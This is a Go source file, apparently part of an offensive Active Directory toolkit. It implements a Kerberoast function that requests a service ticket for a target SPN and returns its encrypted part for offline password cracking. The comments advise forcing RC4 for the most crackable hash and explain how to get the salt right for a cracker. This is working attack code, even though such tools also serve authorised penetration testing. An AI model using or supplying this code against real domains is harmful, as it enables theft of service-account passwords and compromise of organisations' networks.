package kerberos

// KerberoastResult holds the crackable encrypted part of a service ticket
// obtained for a target SPN. The service ticket's enc-part is encrypted with the
// service account's long-term key, so it can be cracked offline to recover that
// account's password. Format it for a cracker with
// attacks.FormatTGSHash(account, result.Realm, result.SPN, result.EType, result.Cipher),
// where account is the service account's sAMAccountName. The account is the
// AES string-to-key salt input (UPPER(realm)+account), so passing the SPN there
// produces the wrong salt and an uncrackable AES hash; it is not carried on the
// result and must be resolved separately (e.g. the account owning the SPN in the
// directory). For RC4 (etype 23) the account field is not used in the salt, so any
// placeholder cracks, but supplying the real sAMAccountName keeps both etypes correct.
type KerberoastResult struct {
	// SPN is the service principal name that was roasted.
	SPN string
	// Realm is the Kerberos realm (uppercased).
	Realm string
	// EType is the encryption type of the ticket's enc-part (23 = RC4 yields the
	// most crackable hash; request it by advertising RC4 in the TGS-REQ).
	EType int
	// Cipher is the raw encrypted part of the service ticket.
	Cipher []byte
}

// Kerberoast requests a service ticket for the given SPN and returns its
// encrypted part for offline cracking. GetTGT must have succeeded first. The PAC
// is not requested (includePAC = false), yielding a shorter, PAC-free ticket as
// Kerberoasting tools do.
//
// To obtain an RC4 (NT-hash-crackable) ticket, ensure RC4 is offered; the KDC
// returns the strongest etype the service account key supports.
func (c *KerberosClient) Kerberoast(spn string) (*KerberoastResult, error) {
	ticket, _, _, _, err := c.GetTGS(spn, false)
	if err != nil {
		return nil, err
	}
	return &KerberoastResult{
		SPN:    spn,
		Realm:  c.realm,
		EType:  ticket.EncPart.EType,
		Cipher: ticket.EncPart.Cipher,
	}, nil
}
